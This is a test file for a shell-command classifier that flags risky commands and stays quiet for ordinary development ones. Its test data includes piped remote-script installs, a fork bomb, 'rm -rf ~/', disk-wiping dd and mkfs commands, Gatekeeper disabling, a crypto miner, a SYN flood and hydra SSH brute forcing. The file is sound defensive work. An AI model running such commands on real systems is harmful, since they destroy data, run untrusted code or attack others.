import { describe, expect, it } from "vitest";
import { classifyCommand, type SessionContext } from "./index.ts";
import { parse } from "./shell.ts";

const mac: SessionContext = { os: "macos", arch: "arm64" };
const linux: SessionContext = { os: "linux", arch: "x64" };
const cloned: SessionContext = { ...mac, clonedThisSession: true };

function offers(command: string, ctx: SessionContext = mac): boolean {
    return classifyCommand(command, ctx).suggest;
}

function ids(command: string, ctx: SessionContext = mac): string[] {
    return classifyCommand(command, ctx).signals.map((s) => s.id);
}

describe("shell parser", () => {
    it("splits lists and pipes and marks piped segments", () => {
        const segs = parse("cd x && curl -s https://a.io/i | sudo -E bash -; echo done");
        expect(segs.map((s) => s.head)).toEqual(["cd", "curl", "bash", "echo"]);
        expect(segs[2]).toMatchObject({ pipedFrom: true, sudo: true });
        expect(segs[1]?.pipesTo).toBe(true);
    });

    it("keeps quoted operators inside one word", () => {
        const segs = parse(`git commit -m "a && b | c"`);
        expect(segs).toHaveLength(1);
        expect(segs[0]?.argv).toEqual(["git", "commit", "-m", "a && b | c"]);
    });

    it("strips env assignments and wrappers", () => {
        const segs = parse("CUDA_VISIBLE_DEVICES=0 nohup time python3 train.py");
        expect(segs[0]?.head).toBe("python3");
    });

    it("parses $( ), <( ) and sh -c strings as nested commands", () => {
        const subst = parse(`/bin/bash -c "$(curl -fsSL https://a.io/i.sh)"`);
        expect(
            subst.some((s) => s.head === "curl" && s.via === "subst" && s.parent === "bash"),
        ).toBe(true);
        const proc = parse("bash <(wget -qO- https://a.io/i.sh)");
        expect(proc.some((s) => s.head === "wget" && s.parent === "bash")).toBe(true);
        const str = parse(`sh -c "npm install && npm start"`);
        expect(str.filter((s) => s.via === "string").map((s) => s.head)).toEqual(["npm", "npm"]);
    });

    it("records redirect targets and skips heredoc bodies", () => {
        const segs = parse("cat <<EOF > notes.txt\nrm -rf /\nEOF\nls");
        expect(segs.map((s) => s.head)).toEqual(["cat", "ls"]);
        expect(segs[0]?.redirects).toEqual(["notes.txt"]);
    });
});

describe("remote scripts piped into a shell", () => {
    it.each([
        "curl -sL https://raw.githubusercontent.com/someone/tool/main/install.sh | sudo bash",
        "wget -qO- https://example.dev/setup | sh",
        "bash <(curl -s https://x.io/i.sh)",
        "curl -fsSL https://example.io/install.sh | tee /tmp/i.sh | sh",
        "wget https://example.io/i.sh && chmod +x i.sh && ./i.sh",
        "curl -o /tmp/i.sh https://example.org/i.sh && bash /tmp/i.sh",
        "iwr -useb https://example.io/setup.ps1 | iex",
        `powershell -c "irm https://example.io/x.ps1 | iex"`,
        "iex ((New-Object Net.WebClient).DownloadString('https://example.net/p.ps1'))",
    ])("offers for %s", (command) => {
        expect(offers(command)).toBe(true);
        expect(classifyCommand(command, mac).category).toBe("untrusted_code");
    });

    it.each([
        "curl -fsSL https://sh.rustup.rs | sh",
        "curl -fsSL https://bun.sh/install | bash",
        `/bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)"`,
        "curl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.40.1/install.sh | bash",
        "curl -LsSf https://astral.sh/uv/install.sh | sh",
        "curl -fsSL https://deno.land/install.sh | sh",
        "curl -fsSL https://get.pnpm.io/install.sh | sh -",
        "curl https://get.volta.sh | bash",
        "irm get.scoop.sh | iex",
    ])("treats the mainstream installer %s as ordinary", (command) => {
        expect(offers(command)).toBe(false);
    });

    it("names the script host as the subject", () => {
        expect(classifyCommand("curl -s https://tools.example.dev/go.sh | bash", mac).subject).toBe(
            "tools.example.dev/go.sh",
        );
    });
});

describe("clones and the code inside them", () => {
    it("offers when an install follows a clone in the same command", () => {
        const c = classifyCommand(
            "git clone https://github.com/user1/repo1 && cd repo1 && npm i && npm start",
            mac,
        );
        expect(c.suggest).toBe(true);
        expect(c.subject).toBe("github.com/user1/repo1");
    });

    it.each([
        "npm install",
        "pip install -r requirements.txt",
        "python setup.py install",
        "make install",
        "./install.sh",
        "cargo build",
        "npm test",
        "docker compose up --build",
    ])("offers for %s inside a directory cloned this session", (command) => {
        expect(offers(command, cloned)).toBe(true);
        expect(offers(command, mac)).toBe(false);
    });

    it.each(["git status", "cat package.json", "ls -la", "grep -rn TODO ."])(
        "stays quiet for the read-only %s in a cloned directory",
        (command) => {
            expect(offers(command, cloned)).toBe(false);
        },
    );

    it("does not offer for a bare clone or a clone of a well-known project", () => {
        expect(offers("git clone --depth 1 https://github.com/someone/thing")).toBe(false);
        expect(offers("git clone https://github.com/vercel/next.js && cd next.js && pnpm i")).toBe(
            false,
        );
    });
});

describe("heavy ML installs and model downloads", () => {
    it.each<[string, SessionContext]>([
        ["pip install diffusers transformers accelerate", mac],
        ["pip install flash-attn --no-build-isolation", mac],
        ["pip install TTS && tts --text hi --model_name tts_models/en/ljspeech/vits", mac],
        ["pip install openai-whisper", mac],
        ["pip install vllm", linux],
        ["pip install torch", linux],
        ["ollama pull llama3.1:70b", mac],
        ["huggingface-cli download black-forest-labs/FLUX.1-dev", mac],
        ["hf download Qwen/Qwen2.5-32B-Instruct-GGUF", mac],
        ["git clone https://huggingface.co/stabilityai/stable-diffusion-xl-base-1.0", mac],
        ["wget https://huggingface.co/someone/model/resolve/main/model-13b.Q4_K_M.gguf", mac],
        ["python scripts/download_models.py --all", mac],
        ["whisper lecture.mp4 --model medium", mac],
        ["accelerate launch train.py --config cfg.yaml", mac],
        ["./webui.sh --listen", mac],
        ["comfy install", mac],
        ["docker run --gpus all -it pytorch/pytorch python train.py", mac],
    ])("offers for %s", (command, ctx) => {
        expect(offers(command, ctx)).toBe(true);
    });

    it.each<[string, SessionContext]>([
        ["pip install torch", mac],
        ["uv pip install torch --index-url https://download.pytorch.org/whl/cpu", linux],
        ["ollama run qwen2.5:0.5b", mac],
        ["ollama run llama3", mac],
        ["ollama list", mac],
        ["huggingface-cli download sentence-transformers/all-MiniLM-L6-v2", mac],
        ["pip install requests python-dotenv elevenlabs", mac],
        ["npm i openai", mac],
    ])("does not offer for %s", (command, ctx) => {
        expect(offers(command, ctx)).toBe(false);
    });

    it("adds an environment signal for NVIDIA-only packages on a Mac", () => {
        expect(ids("pip install bitsandbytes", mac)).toContain("nvidia_only_package");
        expect(ids("pip install bitsandbytes", linux)).not.toContain("nvidia_only_package");
    });
});

describe("suspicious packages", () => {
    it.each([
        ["pip install colourama", "colorama"],
        ["pip install pyt0rch", "pytorch"],
        ["npm i reqeust", "request"],
        ["pip install numpyy", "numpy"],
    ])("flags the typosquat in %s", (command, real) => {
        const c = classifyCommand(command, mac);
        expect(c.suggest).toBe(true);
        expect(c.signals[0]?.evidence).toContain(real);
    });

    it.each([
        "npm install -g windows-crack-activator",
        "pip install free-pro-unlocker",
        "npx robux-generator-free",
    ])("flags the lure package in %s", (command) => {
        expect(offers(command)).toBe(true);
    });

    it.each([
        "pip install unicorn",
        "pip install huggingface_hub",
        "pip install beautifulsoup4 requests lxml",
        "npm i react-dnd chart.js",
        "pip install python-multipart pydantic-settings",
        "uv add fastapi uvicorn sqlmodel",
        "npm i -D @types/node vitest",
        "pip install pandas numpy matplotlib scikit-learn",
        "npm i react-hook-form @hookform/resolvers zod",
    ])("leaves the ordinary install %s alone", (command) => {
        expect(offers(command)).toBe(false);
    });
});

describe("system, kernel, disk and load", () => {
    it.each<[string, SessionContext]>([
        ["sudo apt-get install -y cuda-toolkit-12-4", linux],
        ["sudo apt install -y nvidia-driver-560", linux],
        ["sudo ubuntu-drivers autoinstall", linux],
        ["sudo modprobe v4l2loopback", linux],
        ["sudo grubby --update-kernel=ALL --args=quiet", linux],
        ["sudo dd if=ubuntu.iso of=/dev/disk4 bs=4m", mac],
        ["sudo mkfs.ext4 /dev/sdb1", linux],
        ["rm -rf ~/", mac],
        [":(){ :|:& };:", linux],
        ["stress --cpu 8 --timeout 600", linux],
        ["k6 run --duration 30m --vus 1000 script.js", mac],
        ["hey -z 10m -c 1000 https://api.example.com", mac],
        ["sudo pip install --break-system-packages -r reqs.txt", linux],
        ["docker run -it --privileged --pid=host ubuntu", linux],
        ["nohup python train.py --epochs 100 &", mac],
        ["for f in *.mov; do ffmpeg -i $f -c:v libx265 $f.mp4; done", mac],
    ])("offers for %s", (command, ctx) => {
        expect(offers(command, ctx)).toBe(true);
    });

    it.each<[string, SessionContext]>([
        ["sudo apt install build-essential", linux],
        ["sudo rm -rf /var/lib/docker", linux],
        ["rm -rf node_modules dist", mac],
        ["dd if=/dev/zero of=test.img bs=1M count=100", linux],
        ["wrk -t2 -c50 -d10s http://localhost:3000/", mac],
        ["ab -n 1000 -c 100 https://example.com/", mac],
        ["python train.py --epochs 5", mac],
        ["sysctl -a", linux],
        ["docker run -p 5432:5432 postgres:16", mac],
        ["sudo npm install -g typescript", mac],
    ])("does not offer for %s", (command, ctx) => {
        expect(offers(command, ctx)).toBe(false);
    });
});

describe("lures, exploits and quarantine", () => {
    it.each([
        "python3 claim_airdrop.py --wallet-file ~/.config/solana/id.json",
        "python3 exploit.py 10.0.0.5",
        "gcc -o lpe lpe_poc.c && ./lpe",
        "xattr -d com.apple.quarantine ~/Downloads/Tool.app",
        "sudo spctl --master-disable",
        "7z x payload.7z -pinfected",
        "unzip -P 1234 tool.zip",
    ])("offers for %s", (command) => {
        expect(offers(command)).toBe(true);
    });
});

describe("ordinary development", () => {
    it.each([
        "npm test",
        "pytest -x",
        "go build ./...",
        "go test ./... -race",
        "cargo test",
        "cargo build --release",
        "tsc --noEmit",
        "git commit -m 'docs: explain curl | sh installs'",
        "git push origin main",
        "pip install requests",
        "pip install -r requirements.txt",
        "pip install -e .",
        "npm ci",
        "make",
        "docker compose up -d",
        "docker build -t myapp .",
        "curl https://api.example.com/health",
        "curl -X POST https://api.openai.com/v1/chat/completions -d @body.json",
        "brew install node postgresql@16",
        "grep -rn 'torch.cuda' src/",
        "echo 'pip install torch' >> README.md",
        "npx prisma migrate dev",
        "npx create-next-app@latest my-app",
        "python manage.py migrate",
        "node scripts/build.js",
        "terraform plan",
        "ffmpeg -i in.mov out.mp4",
        "nvidia-smi",
    ])("stays quiet for %s", (command) => {
        expect(offers(command)).toBe(false);
    });
});

describe("abuse policy", () => {
    it.each([
        "xmrig -o pool.example.net:3333 -u wallet",
        "masscan 0.0.0.0/0 -p80",
        "hping3 --flood -S target.example",
        "hydra -l admin -P rockyou.txt ssh://203.0.113.7",
        "git clone https://github.com/someone/mass-dm-sender && cd mass-dm-sender && npm i",
    ])("never offers for %s, and says why", (command) => {
        const c = classifyCommand(command, mac);
        expect(c.suggest).toBe(false);
        expect(c.signals.some((s) => s.id === "abuse")).toBe(true);
    });

    it("treats scans of the local network as LAN-only", () => {
        const c = classifyCommand("nmap -sV 192.168.1.0/24", mac);
        expect(c.suggest).toBe(false);
        expect(c.signals.some((s) => s.id === "lan_scan")).toBe(true);
    });
});

describe("grammar for model ids, modules, system installs and remote builds", () => {
    it.each<[string, SessionContext]>([
        ["python -m mlx_lm.generate --model mlx-community/Llama-3.3-70B-Instruct-4bit", mac],
        ["python train.py --model_name_or_path mistralai/Mistral-7B-v0.1 --lora_r 16", linux],
        ["python -m piper --model en_US-lessac-medium --output_file out.wav", mac],
        ["python scripts/txt2img.py --prompt 'a cat'", mac],
        ["tune run lora_finetune_single_device --config llama3_1/8B_lora", linux],
        ["./build/bin/whisper-cli -m models/ggml-large-v3.bin -f talk.wav", mac],
        ["make && sudo make install", linux],
        ["sudo python3 setup.py install", linux],
        ["sudo pip3 install -r requirements.txt", linux],
        ["make -C /lib/modules/$(uname -r)/build M=$(pwd) modules", linux],
        ["echo 'vm.swappiness=10' | sudo tee -a /etc/sysctl.conf", linux],
        ["sudo dnf install akmod-nvidia", linux],
        ["pip install git+https://github.com/someone/tool", mac],
        ["go install github.com/someone/fastscan@latest", mac],
        ["cargo install --git https://github.com/someone/tool", mac],
        ["deno run -A https://example.dev/script.ts", mac],
        ["open invoice.pdf.exe", mac],
        ["ffmpeg -i in.mkv -c:v libx265 -preset veryslow out.mkv", mac],
    ])("offers for %s", (command, ctx) => {
        expect(offers(command, ctx)).toBe(true);
    });

    it.each<[string, SessionContext]>([
        ["curl -fsSL https://rye.astral.sh/get | bash", mac],
        ["curl -sS https://bootstrap.pypa.io/get-pip.py | python3", mac],
        ["pip install git+https://github.com/huggingface/transformers", mac],
        ["go install golang.org/x/tools/gopls@latest", mac],
        ["aider --model deepseek/deepseek-chat", mac],
        ["litellm --model openai/gpt-4o", mac],
        ["python whisper_client.py meeting.mp3", mac],
        ["python eval.py --model ./checkpoints/best.pt", mac],
        ["python -m pytest tests/", mac],
        ["sudo sysctl -w net.core.somaxconn=4096", linux],
        ["sudo pip install requests", linux],
        ["cargo install ripgrep", mac],
        ["deno run -A main.ts", mac],
    ])("does not offer for %s", (command, ctx) => {
        expect(offers(command, ctx)).toBe(false);
    });
});
